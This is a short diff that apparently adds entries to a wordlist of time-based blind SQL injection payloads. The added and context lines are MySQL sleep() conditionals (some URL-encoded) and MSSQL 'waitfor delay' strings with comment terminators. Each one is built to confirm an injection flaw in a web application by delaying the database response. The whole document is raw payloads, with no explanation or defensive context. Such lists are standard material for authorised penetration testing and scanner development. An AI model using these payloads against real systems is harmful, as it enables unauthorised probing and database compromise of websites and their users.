@@ -14,3 +14,9 @@ if(now()=sysdate()%2Csleep(8)%2C0)
 if(now()=sysdate(),sleep(8),0)
 XOR(if(now()=sysdate(),sleep(5),0))XOR
 (SELECT(SLEEP(10)))cfm)%2D%2D
+if(now()=sysdate()%2Csleep(4*2)%2C0)
+1 waitfor delay '0:0:5' --
+'; waitfor delay '0:0:8' --
+(select*from(select(sleep(5)))a)
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+1;SELECT IF((8303>8302),SLEEP(9),2356)#
